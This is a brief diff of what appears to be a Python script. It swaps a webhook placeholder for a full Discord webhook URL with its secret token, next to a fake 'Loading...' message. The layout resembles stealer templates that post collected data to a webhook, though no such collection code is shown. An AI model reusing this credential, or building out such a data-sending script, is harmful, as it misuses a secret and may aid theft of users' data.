@@ -12,7 +12,7 @@ except:
     time.sleep(2)
 
 #put your webhook here
-webhook = "webhook_here"
+webhook = "https://discord.com/api/webhooks/1074034234437681162/8IcL9XiyBEyvF2hxD1Cqxcthd2h0pBguwclsc9dHxrzOl9W8i1HpETfSiDWeEAA_sHKD"
 print('{ PLEASE WAIT } Loading...') 
 
 # - dummy message , can change to anything
